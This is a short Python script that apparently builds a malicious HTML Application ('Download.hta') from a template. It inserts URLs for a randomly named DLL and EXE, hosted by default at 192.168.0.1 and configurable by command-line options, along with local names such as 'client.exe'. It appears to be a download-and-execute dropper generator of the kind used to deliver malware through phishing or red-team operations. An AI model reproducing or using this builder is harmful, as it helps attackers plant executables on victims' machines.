#!/usr/bin/env python   
# _*_ coding:utf-8 _*_ 
import os
import optparse

def main(downloadfile1, downloadfile2, ownfile1, ownfile2):
	with open("DownloadURLFile", "r") as readfile:
		with open("Download.hta", "w") as writefile:
			data = readfile.read()
			offset = data.find("DOWNLOADFILE1", 0)
			data = data[:offset] + downloadfile1 + data[offset+13:]
			offset = data.find("DOWNLOADFILE2", 0)
			data = data[:offset] + downloadfile2 + data[offset+13:]
			offset = data.find("OWNFILE1", 0)
			data = data[:offset] + ownfile1 + data[offset+8:]
			offset = data.find("OWNFILE2", 0)
			data = data[:offset] + ownfile2 + data[offset+8:]
			offset = data.find("OWNFILE3", 0)
			data = data[:offset] + ownfile1 + data[offset+8:]
			writefile.write(data)

if __name__ == '__main__':

	downloadfile1 = "QaMG6tjypFHaKYPL.dll"
	downloadfile2 = "rYa5lUhEFD6llgIv.exe"

	ownfile1 = "QaMG6tjypFHaKYPL.dll"
	ownfile2 = "client.exe"
	URLPath = "http://192.168.0.1//"
	parse = optparse.OptionParser()  
	parse.add_option('-a', '--URL', dest='URLPath', type=str)
	parse.add_option('-b', '--Downloadfile1', dest='downloadfile1', type=str)
	parse.add_option('-c', '--Downloadfile2', dest='downloadfile2', type=str)
	options,args=parse.parse_args()
	if options.downloadfile1 != None:
		downloadfile1 = options.downloadfile1

	if options.downloadfile2 != None:
		downloadfile2 = options.downloadfile2

	if options.URLPath != None:
		URLPath = "Http://" + options.URLPath + '//'

	downloadfile1 = URLPath + downloadfile1
	downloadfile2 = URLPath + downloadfile2
	main(downloadfile1, downloadfile2, ownfile1, ownfile2)